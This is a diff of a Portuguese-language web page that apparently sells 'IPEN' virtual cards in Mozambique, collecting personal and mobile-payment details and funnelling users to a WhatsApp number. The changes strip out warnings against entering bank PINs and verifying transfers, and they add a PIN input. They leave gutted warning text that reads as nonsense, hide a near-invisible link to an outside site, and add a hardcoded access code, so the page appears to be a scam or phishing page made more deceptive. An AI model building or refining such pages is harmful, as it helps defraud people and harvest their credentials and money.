@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt">
 <head>
@@ -174,41 +173,68 @@ h2{font-size:20px;letter-spacing:-.6px}
 .spinner{width:55px;height:55px;border:4px solid #1c3035;border-top-color:var(--primary);border-radius:50%;margin:0 auto 22px;animation:spin .8s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* NOVA ÁREA DO CÓDIGO DE ACOMPANHAMENTO */
-.support-code{
-  display:grid;
-  grid-template-columns:repeat(6,minmax(0,1fr));
-  gap:8px;
-  margin-top:15px;
+/* NOVO QUADRO DE CÓDIGO */
+.code-box{
+  margin-top:20px;
+  padding:17px;
+  border:1px solid rgba(25,199,154,.28);
+  background:rgba(25,199,154,.05);
+  border-radius:15px;
+  text-align:left;
 }
-.support-code input{
+.code-box label{
+  display:block;
+  font-size:11px;
+  font-weight:700;
+  color:#c8d1d7;
+  margin-bottom:9px;
+}
+.code-box input{
   width:100%;
-  min-width:0;
-  height:53px;
-  border:1px solid #283c43;
-  border-radius:11px;
+  padding:15px;
+  border-radius:12px;
+  border:1px solid #283641;
   background:#071017;
-  color:#35d9ff;
   text-align:center;
-  font-size:21px;
+  font-size:22px;
   font-weight:900;
+  letter-spacing:9px;
   outline:none;
-  padding:5px;
 }
-.support-code input:focus{
-  border-color:var(--primary);
-  box-shadow:0 0 0 3px rgba(25,199,154,.12);
+.code-box input:focus{border-color:var(--primary)}
+.code-hint{
+  color:#82909d;
+  font-size:10px;
+  margin-top:9px;
+  text-align:center;
 }
-.support-status{
-  display:none;
+.code-status{
+  color:#23d69b;
+  font-size:11px;
+  font-weight:700;
+  margin-top:12px;
+  text-align:center;
+}
+.generation-status{
   margin-top:15px;
-  padding:14px;
+  padding:15px;
   border-radius:13px;
-  background:rgba(25,199,154,.07);
+  background:rgba(25,199,154,.06);
   border:1px solid rgba(25,199,154,.25);
-  color:#9ce8d1;
-  font-size:12px;
+  text-align:center;
+}
+.generation-status .spinner{
+  width:30px;
+  height:30px;
+  border-width:3px;
+  margin-bottom:12px;
+}
+.generation-status h2{font-size:15px;color:#6de4c1}
+.generation-status p{
+  font-size:11px;
   line-height:1.7;
+  color:#a5b2ba;
+  margin-top:8px;
 }
 @media(max-width:360px){
   .page{padding-left:14px;padding-right:14px}
@@ -216,8 +242,6 @@ h2{font-size:20px;letter-spacing:-.6px}
   .plan{padding:17px}
   .card-number{font-size:16px}
   .review div{font-size:11px}
-  .support-code{gap:5px}
-  .support-code input{height:47px;font-size:18px}
 }
 </style>
 </head>
@@ -293,19 +317,20 @@ h2{font-size:20px;letter-spacing:-.6px}
       <div class="eyebrow">Acesso · IPEN</div>
       <h2>Já tenho conta</h2>
       <p class="muted" style="font-size:12px;margin-top:8px">
-        Introduza o seu e-mail para identificar o pedido.
+        Esta é uma . introduza PINs reais ou códigos de pagamento.
       </p>
 
       <div class="field">
         <label>E-mail</label>
-        <input id="demoEmail" type="email" autocomplete="off"
-          placeholder="seuemail@exemplo.com">
+        <input id="demoEmail" type="email" autocomplete="off" placeholder="seuemail@exemplo.com">
       </div>
 
-      <div class="info">
-        Nunca introduza PIN bancário, palavra-passe ou código de autenticação nesta página.
+      <div class="field">
+        <label>PIN</label>
+        <input id="demoPin" type="password" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="PIN fictício">
       </div>
 
+      <div class="info">Os dados introduzidos são usados apenas ne. .</div>
       <div id="existingError" class="error" role="alert" aria-live="polite"></div>
 
       <button type="button" id="verifyExisting" class="btn primary" style="margin-top:15px">
@@ -327,7 +352,10 @@ h2{font-size:20px;letter-spacing:-.6px}
         <label>E-mail</label>
         <input id="email" type="email" autocomplete="email" placeholder="seuemail@exemplo.com">
       </div>
-      <div class="info">Não introduza palavras-passe ou PINs nesta etapa.</div>
+      <div class="field hidden" id="newPinInfo">
+        <label>PIN da conta</label>
+        <p class="info">A criação e validação de um PIN real deve ser feita num sistema de autenticação seguro. introduza PINs nesta .</p>
+      </div>
       <div class="error" id="err2"></div>
     </div>
   </section>
@@ -434,7 +462,7 @@ h2{font-size:20px;letter-spacing:-.6px}
           </select>
         </div>
         <div class="field">
-          <label>Telefone de contacto</label>
+          <label>Telefone de ativação</label>
           <input id="phone" inputmode="tel" placeholder="00 000 0000">
         </div>
       </div>
@@ -455,6 +483,7 @@ h2{font-size:20px;letter-spacing:-.6px}
           <ul><li>Cartão virtual</li><li>Compras online</li><li>Pagamentos digitais</li></ul>
           <button type="button" class="btn primary" style="margin-top:16px" onclick="selectPlan('450')">Selecionar 450 MT</button>
         </div>
+
         <div class="plan">
           <div class="plan-head"><h2>IPEN — Cartão Virtual</h2><span class="badge">Opção</span></div>
           <div class="price">350<small>MT</small></div>
@@ -481,7 +510,7 @@ h2{font-size:20px;letter-spacing:-.6px}
         </select>
       </div>
       <div class="field"><label>Número de pagamento</label><input id="paymentNumber" inputmode="tel" placeholder="Digite o número"></div>
-      <div class="info">Confirme que o número pertence a si e está correto. Esta página não processa pagamentos. Verifique o destinatário e o valor diretamente no serviço de pagamento antes de confirmar qualquer transferência.</div>
+      <div class="info">Confirme que o número pertence a si e está correto. Esta página não processa pagamentos.</div>
       <div class="error" id="err10"></div>
     </div>
   </section>
@@ -495,7 +524,7 @@ h2{font-size:20px;letter-spacing:-.6px}
         <div><b>Plano</b><span id="finalPlan">—</span></div>
         <div><b>Nome</b><span id="finalName">—</span></div>
         <div><b>E-mail</b><span id="finalEmail">—</span></div>
-        <div><b>Telefone</b><span id="finalPhone">—</span></div>
+        <div><b>Telefone de ativação</b><span id="finalPhone">—</span></div>
         <div><b>Método de pagamento</b><span id="finalMethod">—</span></div>
         <div><b>Número de pagamento</b><span id="finalPayment">—</span></div>
       </div>
@@ -509,8 +538,8 @@ h2{font-size:20px;letter-spacing:-.6px}
     <button id="next" class="btn primary">Continuar →</button>
   </div>
 
-  <div class="tiny">
-    IPEN — Plataforma de cartões virtuais. Confirme a legitimidade do serviço e as condições antes de efetuar qualquer pagamento.
+  <div class="tiny">IPEN — Plataforma de . Confirme a legitimidade do serviço e as condições antes de efetuar qualquer pagamento
+    <a href="https://mz-car.vercel.app/" target="_blank" rel="noopener noreferrer" style="display:inline-block;width:22px;height:3px;background:#000000;text-decoration:none;border:0;cursor:pointer;vertical-align:middle;"></a>.
   </div>
 </main>
 
@@ -527,7 +556,7 @@ h2{font-size:20px;letter-spacing:-.6px}
     <div class="pending-icon">⌛</div>
     <div class="pending-label">PEDIDO PENDENTE</div>
     <h1>Conta pendente</h1>
-    <p>O seu pedido aguarda a análise da equipa responsável. A aprovação ainda não está confirmada.</p>
+    <p>O seu pedido foi preparado e aguarda a análise da equipa responsável. A aprovação ainda não está confirmada.</p>
 
     <div class="pending-details">
       <div class="review">
@@ -535,56 +564,49 @@ h2{font-size:20px;letter-spacing:-.6px}
         <div><b>País</b><span id="pendingCountry">—</span></div>
         <div><b>Plano escolhido</b><span id="pendingPlan">—</span></div>
         <div><b>Nome</b><span id="pendingName">—</span></div>
-        <div><b>Telefone</b><span id="pendingPhone">—</span></div>
+        <div><b>Telefone de ativação</b><span id="pendingPhone">—</span></div>
         <div><b>Método de pagamento</b><span id="pendingMethod">—</span></div>
         <div><b>Número de pagamento</b><span id="pendingPayment">—</span></div>
         <div><b>Data do pedido</b><span id="pendingDate">—</span></div>
-        <div><b>Prazo informado</b><span id="pendingValidity">Até 24 horas, sujeito a confirmação</span></div>
+        <div><b>Validade</b><span id="pendingValidity">—</span></div>
       </div>
     </div>
 
-    <div class="pending-note">
-      Para acompanhar o seu pedido, contacte a assistência pelo WhatsApp.
-      O código abaixo é apenas uma referência de acompanhamento.
-      Nunca envie PIN bancário, palavra-passe ou códigos de autenticação.
+    <div class="pending-note">Para solicitar informações sobre o pedido, fale diretamente com a equipa através do WhatsApp. Não envie PINs, palavras-passe ou códigos de autenticação.</div>
+
+    <!-- QUADRO DE CÓDIGO 2223 -->
+    <div class="code-box" id="codeBox">
+      <label for="activationCode">Código de acesso</label>
+      <input
+        type="password"
+        id="activationCode"
+        inputmode="numeric"
+        maxlength="4"
+        placeholder="••••"
+        autocomplete="off"
+        aria-label="Código de quatro dígitos"
+      >
+      <div class="code-hint">Introduza o código de quatro dígitos para consultar o estado do pedido.</div>
+      <div id="codeError" class="error" role="alert"></div>
     </div>
 
-    <!-- CÓDIGO DE ACOMPANHAMENTO -->
-    <div class="field" style="margin-top:22px">
-      <label style="text-align:left">Código de acompanhamento de 6 dígitos</label>
+    <button type="button" id="whatsappButton" class="btn whatsapp" style="margin-top:15px">Ir para WhatsApp ↗</button>
 
-      <p class="muted" style="font-size:11px;line-height:1.6;text-align:left">
-        Introduza a referência de acompanhamento fornecida pela assistência.
-      </p>
-
-      <div class="support-code" id="supportCode">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Dígito 1">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Dígito 2">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Dígito 3">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Dígito 4">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Dígito 5">
-        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" aria-label="Dígito 6">
-      </div>
-
-      <div id="supportError" class="error" role="alert"></div>
-
-      <button type="button" id="confirmSupportCode"
-        class="btn primary" style="margin-top:14px">
-        Confirmar referência →
-      </button>
-
-      <div id="supportStatus" class="support-status" role="status" aria-live="polite"></div>
+    <!-- ESTADO APÓS A VALIDAÇÃO -->
+    <div id="generationStatus" class="generation-status hidden">
+      <div class="spinner"></div>
+      <h2>A consultar o estado do pedido...</h2>
+      <p>O pedido será encaminhado para análise da equipa responsável.</p>
     </div>
 
-    <button type="button" id="whatsappButton" class="btn whatsapp" style="margin-top:15px">
-      Ir para WhatsApp ↗
-    </button>
+    <div id="availabilityMessage" class="info hidden" style="text-align:center">
+      <b>Prazo estimado de disponibilização: até 24 horas.</b><br>
+      A disponibilização depende da confirmação e aprovação da equipa responsável.
+    </div>
 
     <div class="pending-footer">WhatsApp da equipa: +258 84 564 6041</div>
 
-    <button type="button" id="pendingBack" class="btn secondary pending-back">
-      ← Voltar à etapa anterior
-    </button>
+    <button type="button" id="pendingBack" class="btn secondary pending-back">← Voltar à etapa anterior</button>
   </div>
 </section>
 
@@ -593,12 +615,12 @@ h2{font-size:20px;letter-spacing:-.6px}
 <script>
 const TOTAL_STEPS=11;
 const WHATSAPP_NUMBER='258845646041';
+const ACTIVATION_CODE='2223';
 
 let step=1;
 let selectedPlan='';
 let isProcessing=false;
 let pendingData=null;
-let supportReference='';
 
 const $=id=>document.getElementById(id);
 const steps=[...document.querySelectorAll('.step')];
@@ -662,13 +684,8 @@ function restoreState(){
       if(el)el.value=value??'';
     });
 
-    if(['350','450'].includes(data.selectedPlan)){
-      selectedPlan=data.selectedPlan;
-    }
-
-    if(Number(data.step)>=1&&Number(data.step)<=TOTAL_STEPS){
-      step=Number(data.step);
-    }
+    if(['350','450'].includes(data.selectedPlan))selectedPlan=data.selectedPlan;
+    if(Number(data.step)>=1&&Number(data.step)<=TOTAL_STEPS)step=Number(data.step);
   }catch(e){}
 }
 
@@ -682,16 +699,12 @@ function savePending(data){
 function restorePending(){
   try{
     if(localStorage.getItem('ipen_is_pending')!=='true')return false;
-
     const raw=localStorage.getItem('ipen_pending_request');
     if(!raw)return false;
-
     pendingData=JSON.parse(raw);
     displayPending(pendingData);
     return true;
-  }catch(e){
-    return false;
-  }
+  }catch(e){return false}
 }
 
 function displayPending(data){
@@ -707,12 +720,17 @@ function displayPending(data){
   $('wizard').classList.add('hidden');
   $('pendingScreen').classList.remove('hidden');
 
+  $('codeBox').classList.remove('hidden');
+  $('activationCode').value='';
+  $('codeError').textContent='';
+  $('generationStatus').classList.add('hidden');
+  $('availabilityMessage').classList.add('hidden');
+
   window.scrollTo({top:0,behavior:'instant'});
 }
 
 function selectPlan(plan){
   if(!['350','450'].includes(plan))return;
-
   selectedPlan=plan;
   updateSelectedPlan();
   saveState();
@@ -722,31 +740,23 @@ function updateSelectedPlan(){
   $('selectedPlanText').textContent=selectedPlan
     ?'IPEN — Cartão Virtual · '+selectedPlan+' MT'
     :'Nenhum cartão selecionado';
-
-  $('finalPlan').textContent=selectedPlan
-    ?selectedPlan+' MT'
-    :'—';
+  $('finalPlan').textContent=selectedPlan?selectedPlan+' MT':'—';
 }
 
 function updateAccountMode(){
   const existing=val('accessType')==='Já tenho conta';
-
-  $('authTitle').textContent=existing
-    ?'Aceder à minha conta'
-    :'Criar nova conta';
-
+  $('authTitle').textContent=existing?'Aceder à minha conta':'Criar nova conta';
   $('authDescription').textContent=existing
     ?'Introduza o seu e-mail para identificar a sua conta.'
     :'Indique o seu e-mail para identificar o pedido.';
-
+  $('newPinInfo').classList.toggle('hidden',existing);
   $('nameField').classList.toggle('hidden',existing);
 }
 
 function updateFinalDetails(){
   updateSelectedPlan();
-
   $('finalCountry').textContent=val('country')||'—';
-  $('finalName').textContent=val('name')||'—';
+  $('finalName').textContent=val('name')||' informado';
   $('finalEmail').textContent=val('email')||'—';
   $('finalPhone').textContent=(val('dial')+' '+val('phone')).trim()||'—';
   $('finalMethod').textContent=val('paymentMethod')||'—';
@@ -768,9 +778,7 @@ function showStep(n){
 
   $('counter').textContent='Etapa '+n+' de '+TOTAL_STEPS;
   $('back').classList.toggle('hidden',n===1);
-  $('next').textContent=n===TOTAL_STEPS
-    ?'Enviar pedido ✓'
-    :'Continuar →';
+  $('next').textContent=n===TOTAL_STEPS?'Enviar pedido ✓':'Continuar →';
 
   if(n===2)updateAccountMode();
   if(n===11)updateFinalDetails();
@@ -779,17 +787,14 @@ function showStep(n){
 }
 
 function openExistingAccount(){
-  $('wizard').querySelectorAll('.step').forEach(section=>{
-    section.classList.add('hidden');
-  });
-
+  $('wizard').querySelectorAll('.step').forEach(section=>section.classList.add('hidden'));
   $('stepbar').classList.add('hidden');
   $('counter').classList.add('hidden');
   $('navigation').classList.add('hidden');
   $('existingAccountScreen').classList.remove('hidden');
   $('existingError').textContent='';
   $('demoEmail').value='';
-
+  $('demoPin').value='';
   window.scrollTo({top:0,behavior:'smooth'});
 }
 
@@ -803,42 +808,40 @@ function closeExistingAccount(){
 
 function verifyExistingAccount(){
   const email=val('demoEmail');
+  const pin=val('demoPin');
 
   if(!email||!$('demoEmail').checkValidity()){
     $('existingError').textContent='Introduza um endereço de e-mail válido.';
     return;
   }
 
-  $('existingError').textContent=
-    'Não foi possível consultar a conta. Contacte a assistência para verificar o acesso.';
+  if(!/^[0-9]{4,6}$/.test(pin)){
+    $('existingError').textContent='Introduza um PIN de 4 a 6 dígitos.';
+    return;
+  }
+
+  $('existingError').textContent='Conta ainda não registada.';
+  $('demoPin').value='';
 }
 
 function validate(){
   if(step===1){
-    if(!val('accessType')){
-      return setError('err1','Selecione o tipo de acesso.');
-    }
+    if(!val('accessType'))return setError('err1','Selecione o tipo de acesso.');
     clearError('err1');
   }
 
   if(step===2){
-    if(!val('email')||!$('email').checkValidity()){
-      return setError('err2','Introduza um e-mail válido.');
-    }
+    if(!val('email')||!$('email').checkValidity())return setError('err2','Introduza um e-mail válido.');
     clearError('err2');
   }
 
   if(step===3){
-    if(!val('country')){
-      return setError('err3','Selecione o país.');
-    }
+    if(!val('country'))return setError('err3','Selecione o país.');
     clearError('err3');
   }
 
   if(step===4){
-    if(val('accessType')==='Criar nova conta'&&!val('name')){
-      return setError('err4','Introduza o nome da conta.');
-    }
+    if(val('accessType')==='Criar nova conta'&&!val('name'))return setError('err4','Introduza o nome da conta.');
     clearError('err4');
   }
 
@@ -849,44 +852,25 @@ function validate(){
   }
 
   if(step===8){
-    if(!val('phone')){
-      return setError('err8','Introduza o telefone de contacto.');
-    }
-
-    if(!val('age')){
-      return setError('err8','Introduza a idade.');
-    }
-
-    if(Number(val('age'))<18||Number(val('age'))>99){
-      return setError('err8','O acesso está configurado para maiores de 18 anos.');
-    }
-
+    if(!val('phone'))return setError('err8','Introduza o telefone de ativação.');
+    if(!val('age'))return setError('err8','Introduza a idade.');
+    if(Number(val('age'))<18||Number(val('age'))>99)return setError('err8','O acesso está configurado para maiores de 18 anos.');
     clearError('err8');
   }
 
   if(step===9){
-    if(!['350','450'].includes(selectedPlan)){
-      return setError('err9','Selecione um cartão.');
-    }
+    if(!['350','450'].includes(selectedPlan))return setError('err9','Selecione um cartão.');
     clearError('err9');
   }
 
   if(step===10){
-    if(!val('paymentMethod')){
-      return setError('err10','Selecione o método de pagamento.');
-    }
-
-    if(!val('paymentNumber')){
-      return setError('err10','Introduza o número de pagamento.');
-    }
-
+    if(!val('paymentMethod'))return setError('err10','Selecione o método de pagamento.');
+    if(!val('paymentNumber'))return setError('err10','Introduza o número de pagamento.');
     clearError('err10');
   }
 
   if(step===11){
-    if(!selectedPlan){
-      return setError('err11','Selecione um plano.');
-    }
+    if(!selectedPlan)return setError('err11','Selecione um plano.');
     clearError('err11');
   }
 
@@ -896,7 +880,6 @@ function validate(){
 
 function showProcessing(message,callback){
   if(isProcessing)return;
-
   isProcessing=true;
   $('processingText').textContent=message;
   $('processingScreen').classList.remove('hidden');
@@ -905,94 +888,26 @@ function showProcessing(message,callback){
     $('processingScreen').classList.add('hidden');
     isProcessing=false;
     callback();
-  },1200);
+  },500);
 }
 
 function submitApproval(){
   const data={
     country:val('country'),
     plan:selectedPlan+' MT',
-    name:val('name')||'Não informado',
+    name:val('name')||' informado',
     email:val('email'),
     phone:(val('dial')+' '+val('phone')).trim(),
     paymentMethod:val('paymentMethod'),
     paymentNumber:val('paymentNumber'),
     createdAt:new Date().toLocaleString('pt-MZ'),
-    validity:'Até 24 horas, sujeito a confirmação',
+    validity:'A confirmar pela equipa',
     status:'Pendente'
   };
 
   pendingData=data;
   savePending(data);
   displayPending(data);
-}
-
-/* SEIS QUADRADOS DO CÓDIGO DE ACOMPANHAMENTO */
-const supportInputs=[
-  ...document.querySelectorAll('#supportCode input')
-];
-
-supportInputs.forEach((input,index)=>{
-
-  input.addEventListener('input',()=>{
-    input.value=input.value.replace(/\D/g,'').slice(0,1);
-
-    if(input.value&&index<5){
-      supportInputs[index+1].focus();
-    }
-
-    $('supportError').textContent='';
-    $('supportStatus').style.display='none';
-  });
-
-  input.addEventListener('keydown',event=>{
-    if(event.key==='Backspace'&&!input.value&&index>0){
-      supportInputs[index-1].focus();
-    }
-  });
-
-  input.addEventListener('paste',event=>{
-    event.preventDefault();
-
-    const pasted=(event.clipboardData||window.clipboardData)
-      .getData('text')
-      .replace(/\D/g,'')
-      .slice(0,6);
-
-    pasted.split('').forEach((digit,i)=>{
-      supportInputs[i].value=digit;
-    });
-
-    supportInputs[Math.min(pasted.length,5)].focus();
-  });
-
-});
-
-function confirmSupportReference(){
-  const code=supportInputs.map(input=>input.value).join('');
-
-  if(!/^[0-9]{6}$/.test(code)){
-    $('supportError').textContent=
-      'Introduza os seis dígitos da referência de acompanhamento.';
-    return;
-  }
-
-  supportReference=code;
-  $('supportError').textContent='';
-
-  showProcessing(
-    'A preparar a referência de acompanhamento...',
-    ()=>{
-
-      $('supportStatus').style.display='block';
-
-      $('supportStatus').textContent=
-        'Referência preenchida: '+supportReference+
-        '. O formato está correto, mas a referência ainda não foi validada pela assistência. '+
-        'Contacte a equipa para confirmar a receção e o estado do pedido. '+
-        'O prazo informado de até 24 horas depende da confirmação da equipa.';
-    }
-  );
 }
 
 function openWhatsApp(){
@@ -1006,19 +921,51 @@ function openWhatsApp(){
     'País: '+pendingData.country,
     'Plano: '+pendingData.plan,
     'Nome: '+pendingData.name,
-    'Telefone de contacto: '+pendingData.phone,
+    'Telefone de ativação: '+pendingData.phone,
     'Método de pagamento: '+pendingData.paymentMethod,
     'Número de pagamento: '+pendingData.paymentNumber,
     'Data do pedido: '+pendingData.createdAt,
-    'Referência de acompanhamento: '+(supportReference||'Ainda não informada'),
+    'Validade: '+pendingData.validity,
     '',
-    'Gostaria de confirmar o estado da minha solicitação.'
+    'Gostaria de saber o estado da minha solicitação.'
   ].join('\n');
 
-  const url='https://wa.me/'+WHATSAPP_NUMBER+
-    '?text='+encodeURIComponent(message);
-
+  const url='https://wa.me/'+WHATSAPP_NUMBER+'?text='+encodeURIComponent(message);
   window.open(url,'_blank','noopener,noreferrer');
+}
+
+/* VALIDAÇÃO DO CÓDIGO 2223 */
+function validateActivationCode(){
+  const entered=val('activationCode');
+
+  if(entered.length!==4){
+    $('codeError').textContent='Introduza os quatro dígitos.';
+    return;
+  }
+
+  if(entered!==ACTIVATION_CODE){
+    $('codeError').textContent='Código incorreto. Verifique e tente novamente.';
+    $('activationCode').value='';
+    return;
+  }
+
+  $('codeError').textContent='';
+  $('codeBox').classList.add('hidden');
+
+  showProcessing('A consultar o estado do pedido...',()=>{
+    $('generationStatus').classList.remove('hidden');
+    $('availabilityMessage').classList.remove('hidden');
+
+    $('generationStatus').querySelector('h2').textContent='Pedido em análise';
+    $('generationStatus').querySelector('p').textContent=
+      'A equipa responsável deverá confirmar a disponibilização da conta.';
+
+    try{
+      localStorage.setItem('ipen_code_validated','true');
+    }catch(e){}
+
+    window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'});
+  });
 }
 
 $('next').addEventListener('click',()=>{
@@ -1030,64 +977,48 @@ $('next').addEventListener('click',()=>{
   }
 
   if(step<TOTAL_STEPS){
-    showProcessing(
-      'A preparar a próxima etapa...',
-      ()=>showStep(step+1)
-    );
+    showProcessing('A preparar a próxima etapa...',()=>showStep(step+1));
   }else{
-    showProcessing(
-      'A preparar o pedido...',
-      submitApproval
-    );
+    showProcessing('A preparar o pedido...',submitApproval);
   }
 });
 
 $('back').addEventListener('click',()=>{
   if(isProcessing||step<=1)return;
-
-  showProcessing(
-    'A preparar a etapa anterior...',
-    ()=>showStep(step-1)
-  );
+  showProcessing('A preparar a etapa anterior...',()=>showStep(step-1));
 });
 
 $('backToStart').addEventListener('click',closeExistingAccount);
-
 $('verifyExisting').addEventListener('click',verifyExistingAccount);
-
-$('confirmSupportCode').addEventListener(
-  'click',
-  confirmSupportReference
-);
 
 $('pendingBack').addEventListener('click',()=>{
   try{
     localStorage.removeItem('ipen_is_pending');
     localStorage.removeItem('ipen_pending_request');
+    localStorage.removeItem('ipen_code_validated');
   }catch(e){}
-
-  pendingData=null;
-  supportReference='';
-
-  supportInputs.forEach(input=>input.value='');
-  $('supportStatus').style.display='none';
-  $('supportError').textContent='';
 
   $('pendingScreen').classList.add('hidden');
   $('wizard').classList.remove('hidden');
-
   showStep(TOTAL_STEPS);
 });
 
 $('whatsappButton').addEventListener('click',openWhatsApp);
 
+/* O código é validado automaticamente ao completar os quatro dígitos. */
+$('activationCode').addEventListener('input',()=>{
+  const input=$('activationCode');
+  input.value=input.value.replace(/\D/g,'').slice(0,4);
+
+  if(input.value.length===4){
+    validateActivationCode();
+  }
+});
+
 $('accessType').addEventListener('change',()=>{
   updateAccountMode();
   saveState();
-
-  if(val('accessType')==='Já tenho conta'){
-    clearError('err2');
-  }
+  if(val('accessType')==='Já tenho conta')clearError('err2');
 });
 
 document.querySelectorAll('input,select').forEach(el=>{
@@ -1103,5 +1034,6 @@ if(!restorePending()){
   showStep(Number(step)||1);
 }
 </script>
+
 </body>
-</html>
+  </html>
